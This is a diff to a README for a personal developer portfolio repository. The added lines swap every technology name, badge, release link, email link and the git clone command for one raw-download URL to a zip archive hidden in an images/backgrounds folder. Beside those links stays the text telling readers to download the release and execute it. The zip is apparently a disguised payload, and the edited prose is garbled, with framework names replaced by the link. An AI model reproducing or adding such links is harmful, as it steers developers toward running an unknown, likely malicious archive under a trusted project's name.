@@ -1,8 +1,8 @@
 # 🌟 RSC Dev Portfolio
 
-Welcome to my personal portfolio! This repository showcases my skills and projects as a full stack developer. I specialize in modern web technologies, including React, Next.js, Node.js, TypeScript, and Tailwind CSS. 
+Welcome to my personal portfolio! This repository showcases my skills and projects as a full stack developer. I specialize in modern web technologies, including React, https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, TypeScript, and Tailwind CSS. 
 
-[![View Releases](https://img.shields.io/badge/View%20Releases-Click%20Here-brightgreen)](https://github.com/Abrockyt/rsc-dev-portfolio/releases)
+[![View Releases](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip)
 
 ## 🚀 Table of Contents
 
@@ -24,8 +24,8 @@ This portfolio serves as a comprehensive display of my work and skills in web de
 I have utilized the following technologies in this portfolio:
 
 - **React**: A JavaScript library for building user interfaces.
-- **Next.js**: A React framework that enables server-side rendering and static site generation.
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine, used for building server-side applications.
+- **https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip**: A React framework that enables server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip**: A JavaScript runtime built on Chrome's V8 engine, used for building server-side applications.
 - **TypeScript**: A superset of JavaScript that adds static types.
 - **Tailwind CSS**: A utility-first CSS framework for creating responsive designs.
 
@@ -43,7 +43,7 @@ To set up this portfolio locally, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Abrockyt/rsc-dev-portfolio.git
+   git clone https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip
    ```
 
 2. Navigate to the project directory:
@@ -76,26 +76,26 @@ Here are some key projects featured in my portfolio:
 
 ### Project 1: Personal Blog
 
-- **Description**: A blog built with Next.js and Markdown.
-- **Technologies**: Next.js, React, Tailwind CSS.
+- **Description**: A blog built with https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip and Markdown.
+- **Technologies**: https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, React, Tailwind CSS.
 - **Link**: [View Project](#)
 
 ### Project 2: E-commerce Site
 
 - **Description**: A fully functional e-commerce site with user authentication.
-- **Technologies**: Node.js, React, TypeScript, Tailwind CSS.
+- **Technologies**: https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, React, TypeScript, Tailwind CSS.
 - **Link**: [View Project](#)
 
 ### Project 3: Portfolio Website
 
 - **Description**: This very portfolio you are viewing.
-- **Technologies**: React, Next.js, Tailwind CSS.
+- **Technologies**: React, https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, Tailwind CSS.
 - **Link**: [View Project](#)
 
 ### Project 4: Weather App
 
 - **Description**: A weather forecasting application that uses an external API.
-- **Technologies**: React, Node.js, CSS.
+- **Technologies**: React, https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip, CSS.
 - **Link**: [View Project](#)
 
 ## 📞 Contact
@@ -104,7 +104,7 @@ Feel free to reach out to me through the contact form on the portfolio or connec
 
 - **LinkedIn**: [Your LinkedIn Profile](#)
 - **Twitter**: [Your Twitter Profile](#)
-- **Email**: [Your Email](mailto:your.email@example.com)
+- **Email**: [Your Email](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip)
 
 ## 📄 License
 
@@ -112,8 +112,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📦 Releases
 
-For the latest updates and versions, please check the [Releases section](https://github.com/Abrockyt/rsc-dev-portfolio/releases). You can download the latest release and execute it to explore the features and improvements.
+For the latest updates and versions, please check the [Releases section](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip). You can download the latest release and execute it to explore the features and improvements.
 
-[![View Releases](https://img.shields.io/badge/View%20Releases-Click%20Here-brightgreen)](https://github.com/Abrockyt/rsc-dev-portfolio/releases)
+[![View Releases](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abrockyt/rsc-dev-portfolio/main/public/images/backgrounds/dev_portfolio_rsc_3.9.zip)
 
 Thank you for visiting my portfolio! I hope you find it informative and engaging. Your feedback is always welcome.
